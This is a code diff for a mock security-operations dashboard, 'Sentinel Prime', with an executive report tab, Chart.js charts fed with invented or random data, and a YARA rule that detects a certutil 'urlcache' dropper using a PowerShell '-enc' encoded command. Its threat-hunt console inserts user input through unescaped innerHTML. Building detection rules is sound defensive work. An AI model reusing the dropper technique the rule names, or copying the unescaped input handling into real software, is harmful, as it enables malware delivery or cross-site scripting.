+                    <tr><td class="text-mono text-cyan" style="font-size:10px;">HUNT-043</td><td style="font-size:11px;">DNS Tunneling — C2</td><td><span class="status status-resolved">Closed</span></td><td><span class="sev sev-critical">CONFIRMED</span></td></tr>
+                  </tbody>
+                </table>
+              </div>
+            </div>
+            <div class="card">
+              <div class="card-header">
+                <div class="card-title"><div class="dot amber"></div>YARA RULES DEPLOYED</div>
+              </div>
+              <div class="card-body" style="padding:8px 14px;font-family:var(--font-mono);font-size:11px;">
+                <div style="background:var(--bg-void);border:1px solid var(--border-glow);border-radius:var(--radius-sm);padding:10px;line-height:1.7;overflow-x:auto;">
+<span style="color:var(--purple);">rule</span> <span style="color:var(--cyan);">APT41_LotL_Dropper_FIN</span> {
+  <span style="color:var(--purple);">meta:</span>
+    author   = <span style="color:var(--amber);">"Ciprian Stefan Plesca"</span>
+    severity = <span style="color:var(--amber);">"CRITICAL"</span>
+    family   = <span style="color:var(--amber);">"APT41/Winnti"</span>
+    date     = <span style="color:var(--amber);">"2025-01-15"</span>
+  <span style="color:var(--purple);">strings:</span>
+    $s1 = <span style="color:var(--green);">{ 63 65 72 74 75 74 69 6c 2e 65 78 65 }</span>
+    $s2 = <span style="color:var(--amber);">"urlcache"</span> nocase
+    $s3 = <span style="color:var(--amber);">"185.220.101.47"</span>
+    $ps = <span style="color:var(--green);">{ 2d 65 6e 63 }</span> <span style="color:var(--text-muted);">/* -enc */</span>
+  <span style="color:var(--purple);">condition:</span>
+    (2 of ($s*)) <span style="color:var(--purple);">and</span> $ps
+}
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- ════════════════════════════════════════
+           TAB: EXECUTIVE REPORT
+      ════════════════════════════════════════ -->
+      <div class="tab-pane" id="tab-reports">
+        <div class="page-header">
+          <div>
+            <div class="page-title">EXECUTIVE SECURITY REPORT</div>
+            <div class="page-subtitle">BOARD-LEVEL METRICS // RISK POSTURE // PROGRAM MATURITY // CISO DASHBOARD</div>
+          </div>
+          <div style="display:flex;gap:8px;">
+            <button class="btn btn-amber">📊 SCHEDULE REPORT</button>
+            <button class="btn btn-cyan">⬇ EXPORT PDF</button>
+          </div>
+        </div>
+
+        <!-- Executive KPIs -->
+        <div style="background:var(--bg-surface);border:1px solid var(--border-glow);border-radius:var(--radius-lg);padding:20px;margin-bottom:14px;">
+          <div style="font-family:var(--font-display);font-size:11px;letter-spacing:2px;color:var(--text-muted);margin-bottom:14px;text-align:center;">ENTERPRISE SECURITY POSTURE — Q1 2025</div>
+          <div style="display:grid;grid-template-columns:repeat(5,1fr);gap:0;border:1px solid var(--border-base);border-radius:var(--radius-md);overflow:hidden;">
+            <div class="exec-metric" style="border-right:1px solid var(--border-base);">
+              <div class="exec-metric-val" style="color:var(--amber);">7.4</div>
+              <div class="exec-metric-label">RISK SCORE / 10</div>
+              <div class="exec-metric-trend" style="color:var(--red);">▲ +0.6 this month</div>
+            </div>
+            <div class="exec-metric" style="border-right:1px solid var(--border-base);">
+              <div class="exec-metric-val" style="color:var(--green);">84%</div>
+              <div class="exec-metric-label">NIST CSF MATURITY</div>
+              <div class="exec-metric-trend" style="color:var(--green);">▼ +4% from Q4</div>
+            </div>
+            <div class="exec-metric" style="border-right:1px solid var(--border-base);">
+              <div class="exec-metric-val" style="color:var(--cyan);">4.2m</div>
+              <div class="exec-metric-label">MEAN TIME DETECT</div>
+              <div class="exec-metric-trend" style="color:var(--green);">▼ -22% improved</div>
+            </div>
+            <div class="exec-metric" style="border-right:1px solid var(--border-base);">
+              <div class="exec-metric-val" style="color:var(--cyan);">2.4h</div>
+              <div class="exec-metric-label">MEAN TIME RESPOND</div>
+              <div class="exec-metric-trend" style="color:var(--green);">▼ -31% improved</div>
+            </div>
+            <div class="exec-metric">
+              <div class="exec-metric-val" style="color:var(--amber);">$2.1M</div>
+              <div class="exec-metric-label">SECURITY BUDGET YTD</div>
+              <div class="exec-metric-trend" style="color:var(--text-muted);">67% utilized</div>
+            </div>
+          </div>
+        </div>
+
+        <div class="grid-2 section-gap">
+          <div class="card">
+            <div class="card-header">
+              <div class="card-title"><div class="dot cyan"></div>SECURITY PROGRAM MATURITY — CMM</div>
+            </div>
+            <div class="card-body">
+              <div style="position:relative;height:220px;">
+                <canvas id="maturityChart" role="img" aria-label="Radar chart showing security program maturity across domains">Maturity radar chart</canvas>
+              </div>
+            </div>
+          </div>
+          <div class="card">
+            <div class="card-header">
+              <div class="card-title"><div class="dot green"></div>INCIDENT TRENDS — 12 MONTHS</div>
+            </div>
+            <div class="card-body">
+              <div style="position:relative;height:220px;">
+                <canvas id="incidentTrendChart" role="img" aria-label="Line chart showing incident counts by severity over 12 months">Incident trend chart</canvas>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="grid-3 section-gap">
+          <div class="card">
+            <div class="card-header"><div class="card-title"><div class="dot red"></div>TOP 5 RISK DRIVERS</div></div>
+            <div class="card-body" style="padding:8px 14px;">
+              <div class="sparkline-row"><div class="sp-name">Ransomware Exposure</div><div class="sp-bar"><div class="sp-fill pf-red" style="width:94%"></div></div><div class="sp-val text-red">9.4</div></div>
+              <div class="sparkline-row"><div class="sp-name">Supply Chain Risk</div><div class="sp-bar"><div class="sp-fill pf-red" style="width:87%"></div></div><div class="sp-val text-red">8.7</div></div>
+              <div class="sparkline-row"><div class="sp-name">Unpatched Vulns</div><div class="sp-bar"><div class="sp-fill pf-amber" style="width:81%"></div></div><div class="sp-val text-amber">8.1</div></div>
+              <div class="sparkline-row"><div class="sp-name">Insider Threat</div><div class="sp-bar"><div class="sp-fill pf-amber" style="width:74%"></div></div><div class="sp-val text-amber">7.4</div></div>
+              <div class="sparkline-row"><div class="sp-name">Cloud Misconfig</div><div class="sp-bar"><div class="sp-fill pf-amber" style="width:68%"></div></div><div class="sp-val text-amber">6.8</div></div>
+            </div>
+          </div>
+          <div class="card">
+            <div class="card-header"><div class="card-title"><div class="dot green"></div>SECURITY INVESTMENTS ROI</div></div>
+            <div class="card-body" style="padding:8px 14px;">
+              <div class="net-stat-row"><div class="ns-label">EDR/XDR Platform</div><div class="ns-val text-green">4.2x ROI</div></div>
+              <div class="net-stat-row"><div class="ns-label">SIEM / SOAR</div><div class="ns-val text-green">3.8x ROI</div></div>
+              <div class="net-stat-row"><div class="ns-label">Security Training</div><div class="ns-val text-green">7.1x ROI</div></div>
+              <div class="net-stat-row"><div class="ns-label">Vuln Management</div><div class="ns-val text-green">5.2x ROI</div></div>
+              <div class="net-stat-row"><div class="ns-label">Identity / PAM</div><div class="ns-val text-green">6.4x ROI</div></div>
+              <div class="net-stat-row" style="border:none;"><div class="ns-label">Zero Trust Program</div><div class="ns-val text-cyan">IN PROGRESS</div></div>
+            </div>
+          </div>
+          <div class="card">
+            <div class="card-header"><div class="card-title"><div class="dot amber"></div>2025 SECURITY ROADMAP</div></div>
+            <div class="card-body" style="padding:8px 14px;">
+              <div class="tl-item"><div class="tl-dot cyan"></div><div class="tl-content"><div class="tl-time">Q1 2025</div><div class="tl-text">Zero Trust Network Access deployment — Phase 1 (Identity)</div></div></div>
+              <div class="tl-item"><div class="tl-dot amber"></div><div class="tl-content"><div class="tl-time">Q2 2025</div><div class="tl-text">SOC2 Type II + PCI-DSS QSA audit. SOAR playbook expansion (+40 automations)</div></div></div>
+              <div class="tl-item"><div class="tl-dot amber"></div><div class="tl-content"><div class="tl-time">Q3 2025</div><div class="tl-text">AI-powered threat detection (ML baselines). Cloud security posture management rollout</div></div></div>
+              <div class="tl-item" style="padding-bottom:0;"><div class="tl-dot green"></div><div class="tl-content"><div class="tl-time">Q4 2025</div><div class="tl-text">Zero Trust Phase 2 (Micro-segmentation). Red Team exercise. ISO 27001 re-certification</div></div></div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Footer / Author -->
+        <div style="text-align:center;padding:16px;border-top:1px solid var(--border-base);font-family:var(--font-mono);font-size:10px;color:var(--text-muted);letter-spacing:1px;">
+          SENTINEL PRIME ENTERPRISE SECURITY OPERATIONS PLATFORM v4.2.0 &nbsp;|&nbsp;
+          AUTHOR: <span style="color:var(--cyan);">CIPRIAN STEFAN PLESCA</span> &nbsp;|&nbsp;
+          CLASSIFICATION: CONFIDENTIAL // EXECUTIVE &nbsp;|&nbsp;
+          GENERATED: <span id="reportDate">2025-01-15 14:22:37 UTC</span>
+        </div>
+      </div>
+
+    </main>
+  </div>
+</div>
+
+<script>
+/* ============================================================
+   SENTINEL PRIME — Application Logic
+   Author: Ciprian Stefan Plesca
+   ============================================================ */
+
+// ─── NAVIGATION ───────────────────────────────────────────
+function showTab(name) {
+  document.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active'));
+  document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+  const tab = document.getElementById('tab-' + name);
+  if (tab) tab.classList.add('active');
+  document.querySelectorAll('.nav-item').forEach(n => {
+    if (n.getAttribute('onclick') && n.getAttribute('onclick').includes(name)) {
+      n.classList.add('active');
+    }
+  });
+  initChartsForTab(name);
+}
+
+// ─── CLOCK ────────────────────────────────────────────────
+function updateClock() {
+  const now = new Date();
+  const pad = n => String(n).padStart(2,'0');
+  const str = `${now.getUTCFullYear()}-${pad(now.getUTCMonth()+1)}-${pad(now.getUTCDate())} | ${pad(now.getUTCHours())}:${pad(now.getUTCMinutes())}:${pad(now.getUTCSeconds())} UTC`;
+  const el = document.getElementById('liveClock');
+  if (el) el.textContent = str;
+  const rd = document.getElementById('reportDate');
+  if (rd) rd.textContent = str;
+}
+setInterval(updateClock, 1000);
+updateClock();
+
+// ─── ALERT COUNT ANIMATION ────────────────────────────────
+let alertCount = 23;
+setInterval(() => {
+  if (Math.random() < 0.3) {
+    alertCount += Math.floor(Math.random() * 3);
+    const el = document.getElementById('alertCount');
+    if (el) el.textContent = alertCount;
+  }
+}, 8000);
+
+// ─── CHART REGISTRY ───────────────────────────────────────
+const chartInstances = {};
+
+function initChartsForTab(name) {
+  if (name === 'dashboard') { initAlertTrendChart(); initSevPieChart(); }
+  if (name === 'vulnerabilities') { initPatchChart(); }
+  if (name === 'network') { initNetworkChart(); initFirewallChart(); }
+  if (name === 'ueba') { initUebaChart(); }
+  if (name === 'reports') { initMaturityChart(); initIncidentTrendChart(); }
+}
+
+function destroyChart(id) {
+  if (chartInstances[id]) { try { chartInstances[id].destroy(); } catch(e){} delete chartInstances[id]; }
+}
+
+// ─── ALERT TREND CHART ────────────────────────────────────
+function initAlertTrendChart() {
+  const id = 'alertTrendChart';
+  destroyChart(id);
+  const labels = [];
+  for(let i=29;i>=0;i--) {
+    const d = new Date(); d.setDate(d.getDate()-i);
+    labels.push(`${d.getMonth()+1}/${d.getDate()}`);
+  }
+  const gen = (base, noise) => labels.map(()=>Math.round(base + (Math.random()-0.5)*noise));
+  chartInstances[id] = new Chart(document.getElementById(id), {
+    type: 'line',
+    data: {
+      labels,
+      datasets: [
+        { label: 'Critical', data: gen(14,10), borderColor: '#ff3355', backgroundColor: 'rgba(255,51,85,0.07)', tension: 0.4, fill: true, borderWidth: 2, pointRadius: 0 },
+        { label: 'High',     data: gen(67,30), borderColor: '#ffaa00', backgroundColor: 'rgba(255,170,0,0.05)', tension: 0.4, fill: true, borderWidth: 2, pointRadius: 0 },
+        { label: 'Medium',   data: gen(120,40),borderColor: '#00d4ff', backgroundColor: 'rgba(0,212,255,0.04)', tension: 0.4, fill: true, borderWidth: 1.5, pointRadius: 0, borderDash: [3,3] }
+      ]
+    },
+    options: {
+      responsive: true, maintainAspectRatio: false,
+      plugins: { legend: { display: false } },
+      scales: {
+        x: { grid: { color: 'rgba(255,255,255,0.04)' }, ticks: { color: '#4a5472', font: { family: 'Share Tech Mono', size: 9 }, maxTicksLimit: 8 }, border: { color: 'rgba(255,255,255,0.06)' } },
+        y: { grid: { color: 'rgba(255,255,255,0.04)' }, ticks: { color: '#4a5472', font: { family: 'Share Tech Mono', size: 9 } }, border: { color: 'rgba(255,255,255,0.06)' } }
+      }
+    }
+  });
+}
+
+// ─── SEVERITY PIE ────────────────────────────────────────
+function initSevPieChart() {
+  const id = 'sevPieChart';
+  destroyChart(id);
+  chartInstances[id] = new Chart(document.getElementById(id), {
+    type: 'doughnut',
+    data: {
+      labels: ['Critical','High','Medium','Low'],
+      datasets: [{ data: [14,28,38,20], backgroundColor: ['#ff3355','#ffaa00','#ffcc44','#00ff88'], borderColor: '#0c0f1a', borderWidth: 3, hoverOffset: 6 }]
+    },
+    options: {
+      responsive: true, maintainAspectRatio: false, cutout: '70%',
+      plugins: { legend: { display: false } }
+    }
+  });
+}
+
+// ─── PATCH CHART ─────────────────────────────────────────
+function initPatchChart() {
+  const id = 'patchChart';
+  destroyChart(id);
+  chartInstances[id] = new Chart(document.getElementById(id), {
+    type: 'bar',
+    data: {
+      labels: ['Sep','Oct','Nov','Dec','Jan'],
+      datasets: [
+        { label: 'Patched', data: [214,267,298,344,187], backgroundColor: 'rgba(0,255,136,0.3)', borderColor: '#00ff88', borderWidth: 1 },
+        { label: 'New Vulns', data: [189,201,176,212,189], backgroundColor: 'rgba(255,51,85,0.2)', borderColor: '#ff3355', borderWidth: 1 }
+      ]
+    },
+    options: {
+      responsive: true, maintainAspectRatio: false,
+      plugins: { legend: { display: false } },
+      scales: {
+        x: { grid: { color: 'rgba(255,255,255,0.04)' }, ticks: { color: '#4a5472', font: { family: 'Share Tech Mono', size: 9 } }, border: { color: 'rgba(255,255,255,0.06)' } },
+        y: { grid: { color: 'rgba(255,255,255,0.04)' }, ticks: { color: '#4a5472', font: { family: 'Share Tech Mono', size: 9 } }, border: { color: 'rgba(255,255,255,0.06)' } }
+      }
+    }
+  });
+}
+
+// ─── NETWORK CHART ────────────────────────────────────────
+function initNetworkChart() {
+  const id = 'networkChart';
+  destroyChart(id);
+  const hrs = Array.from({length:24},(_,i)=>`${String(i).padStart(2,'0')}:00`);
+  chartInstances[id] = new Chart(document.getElementById(id), {
+    type: 'line',
+    data: {
+      labels: hrs,
+      datasets: [
+        { label: 'Ingress (GB)', data: hrs.map(()=>Math.round(200+Math.random()*400)), borderColor: '#00d4ff', backgroundColor: 'rgba(0,212,255,0.06)', tension: 0.4, fill: true, borderWidth: 2, pointRadius: 0 },
+        { label: 'Egress (GB)',  data: hrs.map(()=>Math.round(100+Math.random()*250)), borderColor: '#00ff88', backgroundColor: 'rgba(0,255,136,0.04)', tension: 0.4, fill: true, borderWidth: 1.5, pointRadius: 0, borderDash: [4,2] }
+      ]
+    },
+    options: {
+      responsive: true, maintainAspectRatio: false,
+      plugins: { legend: { display: false } },
+      scales: {
+        x: { grid: { color: 'rgba(255,255,255,0.04)' }, ticks: { color: '#4a5472', font: { family: 'Share Tech Mono', size: 9 }, maxTicksLimit: 8 }, border: { color: 'rgba(255,255,255,0.06)' } },
+        y: { grid: { color: 'rgba(255,255,255,0.04)' }, ticks: { color: '#4a5472', font: { family: 'Share Tech Mono', size: 9 } }, border: { color: 'rgba(255,255,255,0.06)' } }
+      }
+    }
+  });
+}
+
+// ─── FIREWALL CHART ───────────────────────────────────────
+function initFirewallChart() {
+  const id = 'firewallChart';
+  destroyChart(id);
+  chartInstances[id] = new Chart(document.getElementById(id), {
+    type: 'bar',
+    data: {
+      labels: ['Malware URLs','Brute Force','Geo-block','Known C2','Port Scan','DLP Violation','Botnet Traffic'],
+      datasets: [{ data: [287410,214233,189045,147812,98241,61034,47891], backgroundColor: ['#ff3355','#ff3355','#ffaa00','#ff3355','#ffaa00','#9966ff','#ffaa00'], borderRadius: 2 }]
+    },
+    options: {
+      indexAxis: 'y',
+      responsive: true, maintainAspectRatio: false,
+      plugins: { legend: { display: false } },
+      scales: {
+        x: { grid: { color: 'rgba(255,255,255,0.04)' }, ticks: { color: '#4a5472', font: { family: 'Share Tech Mono', size: 9 } }, border: { color: 'rgba(255,255,255,0.06)' } },
+        y: { grid: { display: false }, ticks: { color: '#8b9abf', font: { family: 'Rajdhani', size: 11, weight: '500' } }, border: { color: 'rgba(255,255,255,0.06)' } }
+      }
+    }
+  });
+}
+
+// ─── UEBA CHART ───────────────────────────────────────────
+function initUebaChart() {
+  const id = 'uebaChart';
+  destroyChart(id);
+  chartInstances[id] = new Chart(document.getElementById(id), {
+    type: 'doughnut',
+    data: {
+      labels: ['Data Access','Auth Anomaly','Priv Abuse','Network','Other'],
+      datasets: [{ data: [31,24,19,15,11], backgroundColor: ['#ff3355','#ffaa00','#9966ff','#00d4ff','#00ff88'], borderColor: '#0c0f1a', borderWidth: 3, hoverOffset: 5 }]
+    },
+    options: {
+      responsive: true, maintainAspectRatio: false, cutout: '65%',
+      plugins: { legend: { display: false } }
+    }
+  });
+}
+
+// ─── MATURITY RADAR CHART ─────────────────────────────────
+function initMaturityChart() {
+  const id = 'maturityChart';
+  destroyChart(id);
+  chartInstances[id] = new Chart(document.getElementById(id), {
+    type: 'radar',
+    data: {
+      labels: ['Identify','Protect','Detect','Respond','Recover','Govern'],
+      datasets: [
+        { label: 'Current', data: [84,79,88,76,71,82], borderColor: '#00d4ff', backgroundColor: 'rgba(0,212,255,0.1)', borderWidth: 2, pointBackgroundColor: '#00d4ff', pointRadius: 4 },
+        { label: 'Target',  data: [95,92,95,90,88,95], borderColor: '#00ff88', backgroundColor: 'rgba(0,255,136,0.05)', borderWidth: 1.5, borderDash: [4,3], pointBackgroundColor: '#00ff88', pointRadius: 3 }
+      ]
+    },
+    options: {
+      responsive: true, maintainAspectRatio: false,
+      plugins: { legend: { display: false } },
+      scales: { r: { min: 0, max: 100, grid: { color: 'rgba(255,255,255,0.06)' }, angleLines: { color: 'rgba(255,255,255,0.06)' }, ticks: { color: '#4a5472', font: { family: 'Share Tech Mono', size: 9 }, backdropColor: 'transparent', stepSize: 25 }, pointLabels: { color: '#8b9abf', font: { family: 'Rajdhani', size: 11, weight: '500' } } } }
+    }
+  });
+}
+
+// ─── INCIDENT TREND CHART ─────────────────────────────────
+function initIncidentTrendChart() {
+  const id = 'incidentTrendChart';
+  destroyChart(id);
+  chartInstances[id] = new Chart(document.getElementById(id), {
+    type: 'line',
+    data: {
+      labels: ['Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec','Jan'],
+      datasets: [
+        { label: 'Critical', data: [12,8,15,11,9,14,18,12,10,16,13,14], borderColor: '#ff3355', backgroundColor: 'rgba(255,51,85,0.07)', tension: 0.4, fill: true, borderWidth: 2, pointRadius: 3, pointBackgroundColor: '#ff3355' },
+        { label: 'High',     data: [28,22,31,25,19,27,34,28,22,33,29,24], borderColor: '#ffaa00', backgroundColor: 'rgba(255,170,0,0.04)', tension: 0.4, fill: false, borderWidth: 1.5, pointRadius: 2, pointBackgroundColor: '#ffaa00', borderDash: [4,2] }
+      ]
+    },
+    options: {
+      responsive: true, maintainAspectRatio: false,
+      plugins: { legend: { display: false } },
+      scales: {
+        x: { grid: { color: 'rgba(255,255,255,0.04)' }, ticks: { color: '#4a5472', font: { family: 'Share Tech Mono', size: 9 } }, border: { color: 'rgba(255,255,255,0.06)' } },
+        y: { grid: { color: 'rgba(255,255,255,0.04)' }, ticks: { color: '#4a5472', font: { family: 'Share Tech Mono', size: 9 } }, border: { color: 'rgba(255,255,255,0.06)' } }
+      }
+    }
+  });
+}
+
+// ─── THREAT HUNT TERMINAL ─────────────────────────────────
+document.getElementById('huntInput').addEventListener('keydown', function(e) {
+  if (e.key === 'Enter') {
+    const cmd = this.value.trim();
+    if (!cmd) return;
+    const terminal = document.getElementById('huntTerminal');
+    const line = document.createElement('div');
+    line.innerHTML = `<span class="prompt">sentinel&gt;</span> <span style="color:var(--green);">${cmd}</span>`;
+    terminal.insertBefore(line, terminal.querySelector('.cmd-line'));
+    const resp = document.createElement('div');
+    resp.innerHTML = `<span class="output">[ * ] Processing query... <span style="color:var(--amber);">ANALYZING 4,847 ENDPOINTS</span></span>`;
+    terminal.insertBefore(resp, terminal.querySelector('.cmd-line'));
+    this.value = '';
+    terminal.scrollTop = terminal.scrollHeight;
+  }
+});
+
+// ─── INITIALIZE DASHBOARD CHARTS ─────────────────────────
+window.addEventListener('load', () => {
+  initAlertTrendChart();
+  initSevPieChart();
+});
+
+// ─── FILTER CHIPS ─────────────────────────────────────────
+document.querySelectorAll('.filter-chip').forEach(chip => {
+  chip.addEventListener('click', function() {
+    const siblings = this.closest('.filter-bar').querySelectorAll('.filter-chip');
+    siblings.forEach(c => c.classList.remove('active'));
+    this.classList.add('active');
+  });
+});
+</script>
+</body>
+</html>
